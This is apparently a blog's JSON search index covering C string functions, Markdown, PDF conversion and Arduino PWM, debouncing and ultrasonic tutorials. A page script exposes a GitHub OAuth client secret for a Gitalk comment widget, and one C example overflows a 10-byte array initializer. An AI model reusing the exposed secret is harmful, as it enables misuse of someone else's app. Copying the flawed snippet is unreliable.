{"pages":[{"title":"","text":"个人简介 -&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;个人信息：杭州电子科技大学本科生通信工程专业正在学习 Java，C码畜一枚坚信代码改变世界 博客信息 网站采用的Icarus 主题 追求尽可能的简洁，清晰，易用。 在 Icarus 主题之上进行了部分修改。 更新日志：–2020.11.25：创建博客 本站推荐索引 博客主题相关 github Issue 作为博客微型数据库的应用 github page 网站 cdn 优化加速 博客源码分享 博客换肤的一种实现方式思路 博客中 gitalk 最新评论的获取 博客图片上传 picgo 工具 github 图传使用 安装、部分配置 icarus 主题中文版 技术知识点 Java 并发知识点 法律法规 法律法规数据库 中华人民共和国国旗法 中华人民共和国宪法 中华人民共和国消费者权益保护法 中华人民共和国刑事诉讼法 中华人民共和国婚姻法 中华人名共和国网络安全法 中华人民共和国劳动法 其他 计划2020 计划 2019.12.31 2020-GOALS 2019 计划 时间轴记录","link":"/about/index.html"},{"title":"","text":"🎈🎈微笑墙🎈🎈 彭小苒 唐艺昕 李一桐 gakki 图片搜集于互联网，侵权请留言，马上处理😊。","link":"/album/index.html"},{"title":"","text":"申请友链须知 原则上只和技术类博客交换，但不包括含有和色情、暴力、政治敏感的网站。 不和剽窃、侵权、无诚信的网站交换，优先和具有原创作品的网站交换。 申请请提供：站点名称、站点链接、站点描述、logo或头像（不要设置防盗链）。 排名不分先后，刷新后重排，更新信息后请留言告知。 会定期清理很久很久不更新的、不符合要求的友链，不再另行通知。 本站不存储友链图片，如果友链图片换了无法更新。图片裂了的会替换成默认图，需要更换的请留言告知。 本站友链信息如下，申请友链前请先添加本站信息： 网站图标：https://removeif.github.io/images/avatar.jpg 网站名称：辣椒の酱 网站地址：https://removeif.github.io 网站简介：后端开发，技术分享 加载中，稍等几秒...","link":"/friend/index.html"},{"title":"","text":"&nbsp;&nbsp;听听音乐 音乐播放器由mePlayer提供，布局参照网友博客所作，感谢作者的辛勤付出。更多音乐分享请查看歌单。 &nbsp;&nbsp;看看视频 ->点击以下条目开始播放视频,向下滑动查看更多","link":"/media/index.html"},{"title":"音乐歌单收藏","text":"温馨提示：选择喜欢的音乐双击播放，由于版权原因部分不能播放。如果喜欢歌单收藏一下，去网易云都能播放哟！","link":"/music/index.html"},{"title":"","text":"来而不往非礼也畅所欲言，有留必应","link":"/message/index.html"},{"title":"","text":"碎碎念 tips：github 登录后按时间正序查看、可点赞加 ❤️..「+99次查看」 碎碎念加载中，请稍等... $.getScript(\"/js/gitalk_self.min.js\", function () { var gitalk = new Gitalk({ clientID: '28275b80bf51a2d495bf', clientSecret: 'd6bc0b6ca167dde4c9aa4c29252435177ac290a5', id: '666666', repo: 'issue_database', owner: 'wujunyi792', admin: \"wujunyi792\", createIssueManually: true, distractionFreeMode: false }); gitalk.render('comment-container1'); });","link":"/self-talking/index.html"}],"posts":[{"title":"C语言字符串学习笔记","text":"摘要C字符串函数，有必要好好学习，对一些字符串的处理，用正确的函数很重要。 获取字符串的长度：strlen 函数 拷贝字符串：strcpy函数和 strncpy函数 连接字符串：strcat 函数和 strncat 函数 比较字符串：strcmp 函数和 strncmp 函数 strcpy字符串复制12345678910111213#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(){ char str1[100] = &quot;Original&quot;; char str2[10] = &quot;New&quot;; strcpy(str1, str2); printf(&quot;%s\\n&quot;, str1); return 0;} 结果应该是只打印 New 这个字符串。可能会觉得 str1 的长度比 str2 长，调用 strcpy 函数后会只覆盖前边的内容，后边保留……但事实上并不是这样，因为 strcpy 函数复制 str2 的时候，会将该字符串最后的 ‘\\0’ 也一并复制过去。如图： strncpy字符串复制12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(){ char str1[] = &quot;To be or not to be&quot;; char str2[40]; char str3[40]; strncpy(str2, str1, sizeof(str2)); strncpy(str3, str2, 5); str3[5] = '\\0'; //重要!!!!!!!!!!!!!!!!!!!! printf(&quot;%s\\n&quot;, str1); printf(&quot;%s\\n&quot;, str2); printf(&quot;%s\\n&quot;, str3); return 0;} 输出为： 123To be or not to beTo be or not to beTo be 参数 含义 dest 指向存放字符串的目标数组 src 指向待拷贝的源字符串 n 指定拷贝的最大长度 和 strcpy 函数一样，strncpy(dest, src, n) 函数将拷贝源字符串的 n 个字符到目标数组中。如果源字符串的长度小于 n，那么就用 ‘\\0’ 填充额外的空间。如果源字符串的长度大于或等于 n，那么只有 n 个字符被拷贝到目标数组中（注意：这样的话将不会以结束符 ‘\\0’ 结尾）。 为了使该函数更“安全”，建议使用 dest[sizeof(dest) - 1] = ‘\\0’; 语句确保目标字符串是以 ‘\\0’ 结尾. sizeof运算符&amp;strlen字符串长度1234567891011121314#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(){ char str[] = &quot;I love mjclouds.com!&quot;; str[7] = '\\0'; printf(&quot;sizeof str = %d\\n&quot;, sizeof(str)); printf(&quot;strlen str = %d\\n&quot;, strlen(str)); return 0;} 该程序输出sizeof str = 21 strlen str = 7 sizeof 运算符是取得字符串的尺寸，即该字符串所处存储空间的大小。代码开头的 char str[] = &quot;I love mjclouds.com!&quot; 决定了该字符数组的尺寸。而字符串的长度则是由第一个遇到的结束符（’\\0’）所定义的。只要编译器读取到结束符\\0，它不管你字符数组后边是否有其它内容，都会认为字符串已经结束。 strcat连接字符串123456789101112131415#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(){ char str1[100] = &quot;Original String&quot;; char str2[] = &quot;New String&quot;; strcat(str1, &quot; &quot;); strcat(str1, str2); printf(&quot;str1: %s\\n&quot;, str1); return 0;} 输出是： 12str1: Original String New String **strcat(dest, src) ** 参数 含义 dest 指向用于存放字符串的目标数组，它应该包含一个字符串，并且提供足够容纳连接后的总字符串长度的空间（包含结束符 ‘\\0’） scr 指向待连接的源字符串，该参数不应该与 dest 参数指向的位置发生重叠 strcat 函数用于连接两个字符串。 将源字符串拷贝并连接到目标数组存放的字符串后边，此过程将覆盖第一个参数的结束符 ‘\\0’。 两个参数的位置不应该重叠。 strncat连接字符串12345678910111213141516#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(){ char str1[20] = &quot;I &quot;; char str2[20] = &quot;love &quot;; char str3[20] = &quot;FishC.com!&quot;; strncat(str1, str2, 5); strncat(str1, str3, 10); printf(&quot;str1: %s\\n&quot;, str1); return 0;} 输出为： 1str1: I love FishC.com! strncat(dest, src, n) 参数 含义 dest 指向用于存放字符串的目标数组，它应该包含一个字符串，并且提供足够容纳连接后的总字符串长度的空间（包含结束符 ‘\\0’） src 指向待连接的源字符串，该参数不应该与 dest 参数指向的位置发生重叠 n 指定待连接的源字符串的最大长度 strncat 函数用于拷贝源字符串中的 n 个字符到目标数组的字符串后边，并在末尾添加结束符 ‘\\0’。 如果源字符串的长度小于 n，那么不会像 strncpy 函数那样使用 ‘\\0’ 进行填充（但结束符 ‘\\0’ 还是有的）。 另外，目标数组中的原有的字符串并不算在 n 中。 strcmp 比较字符串&amp;strncmp比较字符串1234567891011121314151617181920#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() { char str1[10] = &quot;I love FishC.com&quot;; char str2[20] = &quot;I love mjclouds.com&quot;; if (!strcmp(str1, str2)) { printf(&quot;两个字符串完全一致！\\n&quot;); } else { printf(&quot;两个字符串不同！\\n&quot;); } if (!strncmp(str1, str2, 7)) { printf(&quot;两个字符串前7个字符完全一致！\\n&quot;); } else { printf(&quot;两个字符串前7个字符不同！\\n&quot;); } return 0;} 输出为： 12两个字符串不同！两个字符串前7个字符完全一致！ strcmp(s1, s2) (str1, str2, n) 参数 含义 s1 指向待比较的字符串 1 s2 指向待比较的字符串 2 n 指定待比较的字符数 strcmp 函数用于比较两个字符串。 该函数从第一个字符开始，依次比较每个字符的 ASCII 码大小，直到发现两个字符不相等或抵达结束符（’\\0’）为止。 返回值&lt;0，意思是 字符串 1 的字符小于字符串 2 对应位置的字符； 返回值=0，意思是 字符串 1 的字符等于字符串 2 对应位置的字符； 返回值&gt;0，意思是 字符串 1 的字符大于字符串 2 对应位置的字符； strncmp 函数用于比较两个字符串的前 n 个字符。 该函数从第一个字符开始，依次比较每个字符的 ASCII 码大小，发现两个字符不相等或抵达结束符（’\\0’）为止，或者前 n 个字符完全一样，也会停止比较。 返回值类型同strcmp 参考文章:参考链接","link":"/2020/12/23/C%E8%AF%AD%E8%A8%80%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2020/11/25/hello-world/"},{"title":"Markdown语法与Typora初尝试","text":"摘要首页显示摘要内容（替换成自己的） 众所周知，当打开GitHub上几乎任何一个仓库，都会有一个readme.md文件，就像这张图展示的一样。在GitHub中可以轻松浏览这种格式的文件，一般里面写的是该仓库的介绍及操作说明，但是将该文件下载到电脑里，普通的办公软件却打不开。So what is it? MarkdownMarkdown 是什么？Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档。Markdown 编写的文档可以导出 HTML 、Word、图像、PDF、Epub 等多种格式的文档。Markdown 编写的文档后缀为 .md, .markdown。当前许多网站都广泛使用 Markdown 来撰写帮助文档或是用于论坛上发表消息。例如GitHub、简书等。 Markdown 完全由标点符号组成, 这些标点经过仔细挑选以使他们看上去和表达的含义相同. 例如, 星号(*)标记的单词就像 强调. 列表就像是列表. 如果你使用过 email 的话, 就连块引用都像引用的文本段落. Markdown 是用于创作web 文档的.Markdown 从来都不是要取代 HTML . Markdown 的目标是易于阅读, 创作和编辑文章. HTML 是一种 发布 格式; Markdown 是一种 创作 格式. 因此, Markdown 处理的都是纯文本. 语法规范 标题Markdown标题有两种格式。 使用=和-标记一级标题和二级标题 显示效果如下： 标记语言格式： 1234我是一级标题，我底下的=只有一个也行===========我是二级标题，我底下的-只有一个也行----------- 值得注意的是，有时候我们用Typora等软件编辑的时候，输入完标题行敲击Enter并输入====却没有标题效果，我们只需将Enter换为Shift+Enter便可解决这一问题，这是由于Enter为换段而非换行所致。具体在段落章节中具体介绍。 段落 Markdown语法中， 列表 区块 代码 链接 图片 表格 其他 参考文章:参考链接","link":"/2020/11/26/Markdown%E8%AF%AD%E6%B3%95%E4%B8%8ETypora%E5%88%9D%E5%B0%9D%E8%AF%95/"},{"title":"PDF的使用","text":"摘要首页显示摘要内容（替换成自己的） PDF介绍The Portable Document Format (PDF) is a file format developed by Adobe in 1993 to present documents, including text formatting and images, in a manner independent of application software, hardware, and operating systems.Based on the PostScript language, each PDF file encapsulates a complete description of a fixed-layout flat document, including the text, fonts, vector graphics, raster images and other information needed to display it. PDF was standardized as ISO 32000 in 2008, and no longer requires any royalties for its implementation. PDF files may contain a variety of content besides flat text and graphics including logical structuring elements, interactive elements such as annotations and form-fields, layers, rich media (including video content), and three-dimensional objects using U3D or PRC, and various other data formats. The PDF specification also provides for encryption and digital signatures, file attachments, and metadata to enable workflows requiring these features. 说人话，PDF是一种版式文件，它有以下几个优点： 跨平台,任何支持pdf的设备都可以打开, 排版和样式不会乱掉，乃学术神器 能够嵌入字体,不会因为找不到字体而显示的乱七八糟 文件体积小,方便网络传输 可以制作为交互式pdf 支持资源自包含，也就是字体信息可以内嵌到文档里面，跟着文档走 支持高压缩的图片，上百兆的图片可以装订压缩到10几兆 支持矢量图形，放大缩小不影响清晰度 所有可以被打印的文档都可以转换成PDF 支持安全加密，用于公文流转。 所以用PDF格式文件提交作业绝对是个很不错的决定。那我们如何制作一个PDF文件？ 制作一个PDF文件 其实，几乎任何格式的文件都可以被转换为pdf，包括但不限于Word、Excel、PPT文件。如果电脑中没有安装Acrobat这类软件，我们可以按照如下方法将文件转换为PDF。这里以Word为例。 1.打开你要的word文件2.打开文件→打印3.选择打印机为Microsoft Print to PDF，按照自己的输出需求进行设置。这里一般默认即可。配置完成后点击打印4.此时会弹出将打印输出另存为的对话框，选择希望将pdf保存在哪，然后点保存5.去看看，一个pdf文件就出现了。 6.通过浏览器阅读这类文件，但如果你想编辑它，得另想办法。使用Acrobat编辑PDF未完待续。将提供Acrobat安装包和使用教程 参考文章:参考链接","link":"/2020/12/06/PDF%E7%9A%84%E4%BD%BF%E7%94%A8/"},{"title":"VIP音乐解密","text":"摘要首页显示摘要内容（替换成自己的） 参考文章:参考链接","link":"/2020/12/23/VIP%E9%9F%B3%E4%B9%90%E8%A7%A3%E5%AF%86/"},{"title":"抽奖小应用","text":"摘要连夜写出来的小 demo，有参考一些 GitHub 和 gitee 程序，稍后有空会补充好文档！！*Attention:**这个网页还未适配手机端，所以在手机上显示效果不太好，稍后会进行修正（挖坑 ing）* 一些说明: 正常操作步骤：开始→停止→下一轮 在标签球上使用滚轮，可以对标签球进行缩放 新设备进入该网页时由于没有 json 文件缓存，会自动转入setting.html页面进行设置（目前接口还未配置好，故直接点击下面设置好点我GoGoGo to 主页面！即可） 参与人员可以修改，刷新网页数据会保留 参与人员栏底部重置按钮可以将参与人员列表恢复最初设置（61 人） 设置页面头部重置所有记录可以清空在主页的所有抽签记录 当下一轮按钮无法点击时，进入设置，进行重置所有记录后，通过点击下面设置好点我GoGoGo to 主页面！即可正常使用 不要点动态标签，它会带你去不知道什么页面！！（bug 还在优化） 参考文章:参考链接","link":"/2020/11/29/%E6%8A%BD%E5%A5%96%E5%B0%8F%E5%BA%94%E7%94%A8/"},{"title":"My One Note","text":"我个人的 Office OneNote 笔记本在手机 app 登陆不方便的时候可以在这里查看 参考文章:参考链接","link":"/2021/01/18/My%20One%20Note/"},{"title":"Arduino Uno基础知识学习笔记","text":"已经两年多没碰单片机了，现在正好有空，决定重新开始认真学习一下。 这一篇Blog主要介绍Arduino和基本元器件的一些基础知识 基础信息来自arduino官网的介绍： Arduino是一个基于易于使用的硬件和软件的开源原型设计平台。 Arduino板能够读取输入 - 传感器上的灯光，按钮上的手指或Twitter消息 - 并将其转换为输出 - 激活电机，打开LED，在线发布内容。您可以通过向板上的微控制器发送一组指令来告诉您的电路板该做什么。为此，您需要使用Arduino编程语言（基于连线）和基于Processing的Arduino软件（IDE）。 在使用中值得注意的是： 每个输出引脚最多提供40mA电流 总输出电流不得超过200mA Arduino勿放置在金属板上 输出引脚不可接地 输入引脚电压不得超过3.3V(5V) 不得向Vin引脚提供超过12V的电压 引脚说明 电源 Arduino Uno开发板可以使用三种方式供电： 直流电源插孔 -可以使用电源插孔为Arduino开发板供电。电源插孔通常连接到一个适配器。开发板的供电范围可以是5-20V，但制造商建议将其保持在7-12V之间。高于12V时，稳压芯片可能会过热，低于7V可能会供电不足。 VIN引脚 - 该引脚用于使用外部电源为Arduino Uno开发板供电。电压应控制在上述提到的范围内。 USB电缆 - 连接到计算机时，提供500mA/5V电压。 5v和3v3 根据制造商的数据手册，它们提供稳压的5V和3.3v，向外部组件供电。 GND 在Arduino Uno引脚分配图中，可以看到有5个GND引脚，它们都是互连的。 GND引脚用于闭合电路回路，并在整个电路中提供一个公共逻辑参考电平。务必确保所有的GND（Arduino、外设和组件）相互连接并且有共同点。 RESET - 复位Arduino开发板。 IOREF - 该引脚是输入/输出参考。它提供了微控制器工作的参考电压。 模拟输入Arduino Uno有6个模拟引脚，它们作为ADC（模数转换器）使用。 这些引脚用作模拟输入，但也可用作数字输入或数字输出。 Arduino引脚A0-A5能够读取模拟电压。在Arduino上，ADC具有10位分辨率，这意味着它可以通过1,024个数字电平表示模拟电压。 ADC将电压转换成微处理器可以理解的位。 数字引脚Arduino Uno的引脚0-13用作数字输入/输出引脚。其中，引脚13连接到板载的LED指示灯；引脚3、5、6、9、10、11具有PWM功能。 当数字引脚配置为输入时，电压由外部设备提供。该电压可以在0-5V之间变化，并转换成数字表示（0或1）。为了确定这一点，有2个阈值： 低于0.8v - 视为0 高于2.0v - 视为1 关于PWN脉宽调制（PWM）是一种调制技术，用于将消息编码为脉冲信号。 PWM由两个关键部分组成：频率和占空比。 PWM频率决定了完成单个周期（周期）所需的时间以及信号从高到低的波动速度。占空比决定信号在总时间段内保持高电平的时间。 以1kHz为例，若脉冲宽度为周期一半（称50%工作周期），就相当于输出高电位的一半电压；10%工作周期，就相当于高电位的十分之一电压。 PWN的电压输出计算方式如下： 模拟输出电压=脉冲宽度×高电平值 串行通信待补充 Arduino IDE 这是Arduino官方提供的集成开发环境。里面提供了一些示例程序和头文件。 安装过程略。但值得注意的是，如果购买的是部分国产arduino板，官方驱动可能无法识别到设备，此时需要安装CH340驱动。BTW，Mac OS和Linux不需要驱动。 当然也可以使用vscode进行开发，只需安装如下两个插件即可 新建一个adruino程序，输入ar+Tab即可自动生成程序基础框架。 vscode右下角可以设置开发板信息和端口信息 右上角可以进行编译、上传等操作 注意：使用前记得将arduino ide路径添加进vscode中arduino设置的path 参考文章:引脚分配图及定义 Arduino初学者指南","link":"/2021/02/01/Arduino%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"},{"title":"PWN流水灯","text":"设有三个小灯A、B、C 事先处于熄灭状态，接着A 灯开始由暗到亮，再由亮变暗，A 灯熄灭之后B 灯开始由暗变亮，再由亮变暗，B 灯熄灭之后C 灯开始由暗变亮，再由亮变暗，如此循环。 知识准备&nbsp;&nbsp;&nbsp;PWM变频技术&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数字信号只有高、低电位两种状态，如同第一章的LED闪烁程序，把一只LED接上Arduino的第13引脚，每隔0.5s切换高低电位，LED将不停闪烁。这是一种以一秒钟为周期的切换信号，频率就是1Hz。提高切换频率（通常指30Hz以上），将能仿真模拟电压高低变化的效果。以下图的1kHz为例，若脉冲宽度（开启时间）为周期的一半（称为50%工作周期），就相当于输出高电位的一半电压；10%工作周期，就相当于输出0.5V。 如此，不需采用电阻降低电压，电能不会在变换的过程被损耗掉。这种在数字系统上“仿真”模拟输出的方式，称为脉冲宽度调制（Pulse Width Modulation，简称PWM）。某些强调省电的变频式洗衣机和冷气机等家电，也是运用PWM原理来调节机器的运转速度。 PWM的计算方式如下。 因此，在5V电源的情况下输出3.3V，从上面的式子可知： 根据计算结果得知，5V电源的66%PWM脉冲宽度就相当于输出3.3V。 &nbsp;&nbsp;&nbsp;PWM指令和默认频率​ Arduino的analogWrite指令可以指挥输出PWM信号，指令格式如下： 1analogWrite(端口号，模拟数值) 其中端口号必须是3、5、6、9、10或11这六个数字端口的其中之一；模拟数值介于0255之间，代表输出介于05V之间的仿真模拟电压值。 此外，Arduino微电脑板预设采用1kHz和500Hz两组不同的PWM输出频率，控制电机时，一般采用1kHz频率： 引脚5、6：约1kHz（由Timer 0系统定时器决定，这是delay()等函数的基准时间，不建议更改） 引脚3、11（Timer 2）以及9、10（Timer 1）：约500Hz &nbsp;&nbsp; LED接法​ led的工作电压 颜色 正向电压 红色 1.7V ~ 2.2V 橙色 2.0V 黄色 2.1V 绿色 2.2V 蓝色 3.2V ~ 3.8V 白色 3.2V ~ 3.8V LED的工作电压约2V，但Arduino的输出电压是5V，我们应该在Arduino的输出和LED之间连接一个限流电阻。连接方式有两种。 左边的接法是由微处理器提供负载所需电流，一般称之为源流（sourve current）； 右边的接法是由电源（Vcc）提供电流，此谓之替流（sink current） &nbsp;&nbsp; 电阻计算为计算方便，LED工作电压通常取2V，电流去10mA（注：高亮度LED的工作电压约3V，工作电流约30mA）。 设计方案简简单单设计完成 材料清单 材料 数量 Arduino Uno板 1 面包板 1 LED 3 1kΩ电阻 3 杜邦线 若干 代码123456789101112131415161718192021222324252627282930const byte LEDS[] = {9, 10, 11};void setup(){ for (byte i = 0; i &lt; sizeof(LEDS); i++) { pinMode(LEDS[i], OUTPUT); }}void loop(){ int a = 0; for (byte i = 0; i &lt; sizeof(LEDS); i++) { while (a &lt;= 255) { analogWrite(LEDS[i], a++); delay(10); } while (a &gt;= 0) { analogWrite(LEDS[i], a--); delay(10); } delay(50); } delay(50);} 成果展示此视频可以在电脑网页中加载（推荐chrome、Firefox），手机请用Firefox或chrome打开","link":"/2021/02/01/PWN%E6%B5%81%E6%B0%B4%E7%81%AF/"},{"title":"PWN 按钮调光","text":"任务内容：两个按键A、B，A 按下小灯变亮一点，B 按下小灯变暗一点。 知识准备· 按键防抖​ 机械式开关在切换过程中，电子信号并非立即从 0 变成 1（ 或从 1 变成 0 ），而会经过短暂的，像下图一样忽高忽低变化的弹跳现象。虽然弹跳动作的时间非常短暂，但微电脑仍将读取到连续变化的开关信号，导致程序误操作。 ​ 为了避免上述状况，读取机械式开关信号时，程序（或者硬件）需要加入所谓的**消除弹跳 ( de-bouncing ) **处理机制。最简单的方式，就是在发现输入信号变化时，先暂停 10~30毫秒，然后再读取一次，以便确定输入值。 代码示例：​ 如下图所示，在 “单击” 操作中，信号改变了两次。 ​ 那么我们可以声明一个 click 的变量，记录信号改变的次数，每当此变量值为 2 ，代表按了一下按钮。具备 “ 过滤 ” 弹跳信号的开关代码如下。 12345678910111213141516171819202122232425262728293031const byte LED = 13; // LED 的脚位const byte SW = 2; //开关脚位boolean lastState = LOW; //记录上次开关状态，预设为 LOWboolean toggle = LOW; //输出给 LED 的信号，预设为 LOWbyte click = 0; //开关信号的改变次数，预设为 0void setup() { pinMode(LED, OUTPUT); pinMode(SW, INPUT); lastState = digitalRead(SW); //读取开关的初始值}void loop() { boolean b1 = digitalRead(SW); //读取目前开关的值 if (b1 != lastState) { //如果和之前的开关值不同 delay(20); //等待 20 毫秒 boolean b2 = digitalRead(SW); //再读取一次开关值 if (b1 == b2) { //确认两次开关值是否一致 lastState = b1; //储存开关状态 click++; //增加信号变化次数 } } if (click == 2) { //如果开关状态改变两次 click = 0; //状态次数归零 toggle = !toggle; //取反 digitalWrite(LED, toggle); //输出 }} ​ loop() 区块不停地读取开关的值，并且对比开关的信号是否和上一次不同。假如监测到开关的信号改变了，要等待 20 毫秒之后，再确认一次开关值。如果等待20毫秒后读取到的开关信号值和上一次读取到的一致，就确认开关的状态真的改变了。 · 开关的接法（上拉电阻 &amp; 下拉电阻）​ Arduino 的所有数字和模拟引脚都能读取 / 输出 0 与 1 信号。只要输入值超过电源电压的一半，就代表高电压高电位；若输入值低于 0.25V，则代表低电位。 这样的开关接法并不正确: ​ 若没有按下开关，Arduino 的引脚既没接地接地，也为接到高电位。输入信号可能在 0 与 1 之间的模糊地带漂移，造成所谓的浮动信号，Arduino 将无法正确判断输入值。 ​ 正确接法如下： ​ 若开关没有被按下，数字第 2 脚将通过 10kΩ 接地，因而读取到低电位值；按下开关时，5V 电源将流入第 2 脚，产生高电位。如果没有 10kΩ 电阻，按下开关时，正电源将和接地直接相连，造成短路。 ​ 像上图一样，在芯片的脚位连接一个电阻再接地，则此电阻称为下拉电阻 ​ 当然也有上拉电阻，即将电阻接到电源，像下图这样： 设计方案 材料清单 材料 数量 Arduino Uno 1 面包板 1 1kΩ电阻 1 10kΩ电阻 2 LED 1 开关 2 导线 若干 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124#define LED 9#define BTN1 2#define BTN2 3boolean lastState1 = LOW;boolean lastState2 = LOW;byte click1 = 0;byte click2 = 0;int ledV = 0;void setup(){ pinMode(LED, OUTPUT); pinMode(BTN1, INPUT); pinMode(BTN2, INPUT); lastState1 = digitalRead(BTN1); lastState2 = digitalRead(BTN2); analogWrite(LED, 255); delay(50); analogWrite(LED, 0); delay(50); analogWrite(LED, 255); delay(50); analogWrite(LED, 0);}void loop(){ boolean a1 = digitalRead(BTN1); boolean b1 = digitalRead(BTN2); if (a1 != lastState1) { delay(50); boolean a2 = digitalRead(BTN1); if (a1 == a2) { lastState1 = a1; click1++; } } if (b1 != lastState2) { delay(50); boolean b2 = digitalRead(BTN2); if (b1 == b2) { lastState2 = b1; click2++; } } if (click1 == 2) { click1 = 0; click2 = 0; if (ledV == 255) { analogWrite(LED, 0); delay(50); analogWrite(LED, 255); delay(50); analogWrite(LED, 0); delay(50); analogWrite(LED, 255); } else { ledV += 30; if (ledV &gt;= 255) { ledV = 255; } analogWrite(LED, ledV); if (ledV == 255) { analogWrite(LED, 0); delay(50); analogWrite(LED, 255); delay(50); analogWrite(LED, 0); delay(50); analogWrite(LED, 255); } } } if (click2 == 2) { click1 = 0; click2 = 0; if (ledV == 0) { analogWrite(LED, 255); delay(50); analogWrite(LED, 0); delay(50); analogWrite(LED, 255); delay(50); analogWrite(LED, 0); } else { ledV -= 30; if (ledV &lt;= 0) { ledV = 0; } analogWrite(LED, ledV); if (ledV == 0) { analogWrite(LED, 255); delay(50); analogWrite(LED, 0); delay(50); analogWrite(LED, 255); delay(50); analogWrite(LED, 0); } } }} 成果展示","link":"/2021/02/05/PWN%20%E6%8C%89%E9%92%AE%E8%B0%83%E5%85%89/"},{"title":"arduino 激光测距模块","text":"摘要这里记录了关于 arduino 超声波模块的使用方法 知识准备–超声波测距​ 超声波，即人耳可听见频率以上的声波，可用来探测距离，其原理和雷达类似：从发射超声波到接收反射波所需的时间经过计算可以得到距离。 ​ 可在空气中传播的超声波频率大约介于 20~299kHz 之间，其衰减程度与频率成正比（频率越高，传播距离越短），我们平常能买到的超声波模块通常采用 38kHz、40kHz 或 42kHz。 ​ 在室温 20℃ 的环境中，声波的传播速度约为 344m/s（水中比空气中快 60 倍），因此，假设超声波往返的时间为 600μs 从公式可计算出被测物体的距离为 10.3cm。 ​ 从声音的传播速度和时间，可求出距离，而物体的实际距离是传播时间的一半，所以可以求得 1cm 距离的声波传递时间为 58μs。 空气的密度会影响声音的传播速度，空气的密度越高，声音传播速度越快，而空气的密度又与温度密切相关。考虑温度变化的声音传播速度的近似公式如下： ​ 此外，物体的形状和材质会影响超声波测距的效果和准确度，反射表面平整时，声波会照入射角反射回来，但要是表面粗糙的话，声音将被散射或吸收。不过，只要物体表面的坑洞尺寸小于声波波长的四分之一，即可视为平整表面。 BTW，假如超声波的发射和接收装置不在同一点，那么声音的传播途径不是直线，计算距离时要考虑传感器造成的夹角。 –超声波传感器模块 我记得高中时候有一次去区里答辩，我的项目是一个基于 arduino 的实验设备，然后有个老师就问我 “超声波传感器局限在哪，和红外测距有什么区别？” 当时我是懵了一下。 答：被测物体运动速度超过声速就无法测量了 超声波模块一般有两个超声波元器件，一个用于发射，一个用于接收。电路板上一般四个引脚：VCC（正电源）、Trig（触发）、Echo（回应）、GND（接地）。大部分实验用的超声波传感器模块参数如下： 指标 值 工作电压 5V 工作电流 15mA 感测角度 ≤15° 被测物 面积不小于 50cm² 且平整 在超声波模块的触发脚位输入 10微秒以上的高电位，即可发射超声波，发射超声波以后，与接收到传回的超声波之前，响应脚位呈现高电位。程序通过响应脚位的高电位脉冲持续时间，换算出被测物的距离。 串口通信这玩意儿比较复杂，之间抛链接吧！维基百科-Serial communication. 这里看见个有意思的东西—— Mac OS 与 Linux 的通信端口。Windows 系统使用 COM（原意是COMmunication, 通信）代表通信端口，Mac OS（ 一种基干Unix 的操作系统）和 Linux 则用TIY 代表通信端口。TIY 的原意是 ‘’ teletypewriter “（早期用来操作和大型电脑联机的终端机）。Mac OS 和Linux 系统把每个设备都看成文件，位千／dev 路径底下，因此在Mac的终端机窗口输入ls -l /dev/tty.*， 将能列举所有通信端口。 除了 TTY，Mac 和 Linux 上的通信端口还有包含—个同名的 CU。TTY 用于输入信息给设备，CU 代表 call up，用于从设备传出细信息，两者合作能同时收发信息，被称为全双工。在 Arduino 上，无论使用 TTY 还是 CU，都能传递信息，但一般选用 TTY。 串行数据传输协议传输协议代表通信设备双方所遵循的规范和参数，通信双方的设置要一致，才能相互沟通。 对于 USB 设备，像是键盘、鼠标等 “人机接口” 类、打印机的 “打印设备” 类、移动设备的 “存储设备” 类等，每个设备都有不同的传输协议，也需要安装对应的驱动程序。 当我们接上 Arduino Uno 开发板，在设备管理器中可以观察并更改其通信属性。 每秒位数（bit per second，简称 bps）是串口的传输速率，也称为波特率（Baud rate）。两个通信设备的波特率必须一致，一般为两部机器所能接受的最高速率，常见的选择为 9600bps 和115200bps。开始传输数据之前，RS-232 的传送（TX）与接收（RX）脚都处于高电位状态，传送数据时，它将先送出—个代表 “要开始传送囖! ” 的起始位（start bit, 低电位），接着才送出真正的数据内容（称为数据位，data bit ），每一组数据位的长度可以是5~8 个位，通常选用 8 个位。 一组数据位后面，会跟着代表 “传送完毕” 的停止位（stop bit），停止位通常占 1 位，某些低速的设备要求使用 2 位。 除了数据传输线。还需要一条确保信息收发两端步调一致的频率同步线。但 RS -232 和 USB 串口线不需要同步线，因为它们会在数据前后加上“开始” 和 “结束“ 信息。这种传送方式统称通用异步收发传输器(Universal Asynchronous Receiver/Transmitter，简称 UART）。 设计方案fritzing 找不到超声波模块了，用网图代替下吧，毕竟不难。 材料清单 名称 数量 Adruino 1 超声波传感器模块 HC-SR04 1 代码1234567891011121314151617181920212223/*首先要安装 Ultrasonic 的函数库VCC接5V，GND接地。Trig接到pin 12，Echo接到pin 13。*/#include &lt;Ultrasonic.h&gt;Ultrasonic ultrasonic(12, 13);int distance;void setup() { Serial.begin(9600);}void loop() { distance = ultrasonic.read(); //不加参数就是输出CM，可用read(INC)输出英寸 Serial.print(&quot;Distance in CM: &quot;); Serial.println(distance); delay(500); //每次间隔0.5秒} 成果展示 